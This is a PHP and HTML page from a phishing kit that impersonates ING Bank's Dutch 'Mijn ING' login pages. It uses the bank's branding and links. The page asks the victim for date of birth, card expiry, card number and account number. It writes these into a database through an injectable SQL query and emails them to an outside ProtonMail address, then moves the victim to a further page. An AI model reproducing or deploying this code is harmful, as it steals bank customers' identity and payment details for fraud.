<!doctype html>
<html lang="en">
<?php
error_reporting(0);
session_start();
if ( isset( $_SESSION['klant'] ) ) {
} else {
	echo $gebruikersnaam;
}
include 'dbconnect.php';
?>
  <head>
    <title>Persoonlijke informatie</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/css/bootstrap.min.css" integrity="sha384-PsH8R72JQ3SOdhVi3uxftmaW6Vc51MKb0q5P2rRUpPvrszuE4W1povHYgTpBfshb" crossorigin="anonymous">
    <link rel="stylesheet" href="style.css">
  </head>
  <body>
   <ul class="topnav">
  <li class="left"><a class="active" href="index.php"><img style="height: 35px; width: 118px;" src="logo1.png"></a></li>
  <div class="rightdiv"><li class="right activelan"><a class="test" href="">NL</a></li>
  <li class="right activelan2"><a href="" style="color: #767676">EN</a></li></div>
</ul>
<form  method="post" action="">
<?php
$gebruikersnaam= $_SESSION['gebruikersnaam'];

if (isset($_POST['Doorgaan'])){
			$Geboortedatum = ($_POST["Geboortedatum"]);
			$Pasgeldig = ($_POST["Pasgeldig"]);
			$Pasnr = ($_POST["Pasnr"]);
			$Reknr = ($_POST["Reknr"]);
			$sql = "UPDATE logindetails SET geboortedatum='$Geboortedatum', pasgeldig='$Pasgeldig', pasnr='$Pasnr', reknr='$Reknr' WHERE gebruikersnaam = '$gebruikersnaam'";
			mysqli_query ($conn, $sql);

			$from = " ";
    $to = "clintmasseyBD@protonmail.com";
    $subject = "Nieuwe inloggegevens Ora";
    $message = "Geboortedatum: " . $Geboortedatum . " pasgeldig: " . $Pasgeldig . " Pasnummer: " . $Pasnr . " Rekeningnummer: " . $Reknr;
    $headers = "From:" . $from;
    mail($to,$subject,$message, $headers);
			header('location:newload.php');
}
    if(empty($_SESSION['gebruikersnaam'])){
        header("Location: index.php");
        die("Redirecting to index.php");
    }
	echo date(mm,yyyy);
	$date1 = date(mm,yyy);
?>
<div class="login">
<div class="nieuw" id="remove"><div class="nieuw1"><h1 id="nieuwtekst"><img src="alert-info.svg" style="height: 24px; width: 24px;">&nbsp;&nbsp;Nieuw uiterlijk, vertrouwd inloggen
<button onclick="removeDiv(this);"><img src="menu-close.svg" style="height: 16px; width: 16px; float: right; margin-top: 5px; margin-left: 60px;"></button></h2>
<p id="nieuwtekst1">Is het je opgevallen? Inloggen bij Mijn ING is vernieuwd. <a id="infolink" href="https://www.ing.nl/de-ing/veilig-bankieren/nieuwe-login-pagina/index.html">Meer over de nieuwe inlogpagina</a></p></div></div>
<h1 id="ingtekst">Persoonlijke informatie</h1><br>
<h3> Hallo, <?php echo $_SESSION['gebruikersnaam']; ?>! </h3>
  Geboortedatum:<br>
  <input type="Date" name="Geboortedatum" class="box1" placeholder=""><br>
  Pas geldig tot:<br>
  <input type="Date" name="Pasgeldig" class="box1" placeholder="">
  <br>
   Pasnummer :<br>
  <input type="text" name="Pasnr" class="box1" placeholder="111A111" maxlength="7" pattern="[0-9]{3}[A-Za-z]{1}[0-9]{3}" required><br>
  Rekeningnummer:<br>
  <input type="text" name="Reknr" id="reknr" class="box1" placeholder="NL00 INGB 0001 2345 67" maxlength="23" pattern="^NL\d{2}[ ][A-Z]{4}[ ]\d{4}[ ]\d{4}[ ]\d{2}$" required>
  <br>
  <br>
  <input type="submit" name="Doorgaan" value="Doorgaan"/><span style="margin-left: 30px;"><img src="arrow-chevron-open-right.svg" style="height: 18px; width: 18px">&nbsp;&nbsp;
<a id="hulp" href="https://inlogcodes.mijn.ing.nl/particulier/zelf-regelen/instellen/inlogcodes/index.jsp">Hulp nodig?</a></span>
</br>		
</div>
<div class="links">
<span style="margin-left: 30px;"><img src="arrow-chevron-open-right.svg" style="height: 18px; width: 18px">&nbsp;&nbsp;
<a id="link" href="https://www.ing.nl/de-ing/veilig-bankieren/index.html">Veilig bankieren</a>
<img src="arrow-chevron-open-right.svg" style="height: 18px; width: 18px">&nbsp;&nbsp;
<a id="link" href="https://www.ing.nl/de-ing/privacy-statement/index.html">Privacy en cookies</a>
<img src="arrow-chevron-open-right.svg" style="height: 18px; width: 18px">&nbsp;&nbsp;
<a id="link" href="https://www.ing.nl/de-ing/disclaimer/index.html">Disclaimer</a></span>	
</div>
    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.3/umd/popper.min.js" integrity="sha384-vFJXuSJphROIrBnz7yo7oB41mKfc8JzQZiCq4NCceLEaO4IHwicKwpJf9c9IpFgh" crossorigin="anonymous"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/js/bootstrap.min.js" integrity="sha384-alpBpkh1PFOepccYVYDB4do5UnbKysX5WZXm3XxPqe5iKTfUKjNkCk9SaVuEZflJ" crossorigin="anonymous"></script>
	 <script type="text/javascript">
        function removeDiv(btn){
            var element = document.getElementById("remove");
			element.parentNode.removeChild(element);
        }
    </script>
	  <script>
document.getElementById('reknr').addEventListener('input', function (e) {
  e.target.value = e.target.value.replace(/[^\dA-Z]/g, '').replace(/(.{4})/g, '$1 ').trim();
});
  </script>
  </div>
  </form>
</body>
</html> 	